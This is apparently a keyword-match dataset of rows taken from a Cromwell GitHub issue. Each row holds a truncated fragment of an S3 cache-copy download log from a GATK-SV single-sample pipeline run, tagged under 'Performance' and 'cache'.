Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-118/cacheCopy/SR00c.NA18941.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-118/cacheCopy/SR00c.NA18941.txt.gz.tbi; 1608597141037,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz; 1608597144746,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz; 1608597146753,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:55865,cache,cacheCopy,55865,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz.tbi; 1608597391284,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz; 1608597393258,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-27/cacheCopy/SR00c.HG01384.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-27/cacheCopy/SR00c.HG01384.txt.gz.tbi; 1608597394986,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evide",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:123173,cache,cacheCopy,123173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-130/cacheCopy/SR00c.NA19377.txt.gz.tbi; 1608597008325,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz; 1608597012199,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-153/cacheCopy/SR00c.NA20895.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-153/cacheCopy/SR00c.NA20895.txt.gz; 1608597014237,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:19705,cache,cacheCopy,19705,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz.tbi; 1608597331137,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-121/cacheCopy/SR00c.NA18995.txt.gz; 1608597333778,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-117/cacheCopy/SR00c.NA18923.txt.gz; 1608597335401,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:106959,cache,cacheCopy,106959,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-138/cacheCopy/SR00c.NA19795.txt.gz.tbi; 1608597455771,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-112/cacheCopy/SR00c.NA18539.txt.gz; 1608597458007,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-3/cacheCopy/SR00c.HG00140.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-3/cacheCopy/SR00c.HG00140.txt.gz.tbi; 1608597459482,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evidenc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:141901,cache,cacheCopy,141901,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-139/cacheCopy/SR00c.NA19818.txt.gz.tbi; 1608597428681,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-100/cacheCopy/SR00c.HG04158.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-100/cacheCopy/SR00c.HG04158.txt.gz; 1608597430528,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-30/cacheCopy/SR00c.HG01474.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-30/cacheCopy/SR00c.HG01474.txt.gz.tbi; 1608597432512,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evide",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:133792,cache,cacheCopy,133792,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-141/cacheCopy/SR00c.NA20126.txt.gz.tbi; 1608597252335,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-132/cacheCopy/SR00c.NA19449.txt.gz; 1608597255692,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz; 1608597256940,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:85763,cache,cacheCopy,85763,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-144/cacheCopy/SR00c.NA20346.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-144/cacheCopy/SR00c.NA20346.txt.gz.tbi; 1608597348432,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-120/cacheCopy/SR00c.NA18956.txt.gz; 1608597351053,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-124/cacheCopy/SR00c.NA19062.txt.gz; 1608597352822,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:111314,cache,cacheCopy,111314,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-148/cacheCopy/SR00c.NA20752.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-148/cacheCopy/SR00c.NA20752.txt.gz.tbi; 1608597438407,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-115/cacheCopy/SR00c.NA18560.txt.gz; 1608597439856,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-32/cacheCopy/SR00c.HG01572.txt.gz.tbi; 1608597442529,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evide",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:136915,cache,cacheCopy,136915,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-156/cacheCopy/SR00c.NA21133.txt.gz.tbi; 1608597049133,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-127/cacheCopy/SR00c.NA19184.txt.gz; 1608597051239,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz.tbi; 1608597053171,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:30298,cache,cacheCopy,30298,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz.tbi; 1608597470124,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-44/cacheCopy/SR00c.HG01982.txt.gz.tbi; 1608597472441,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz to 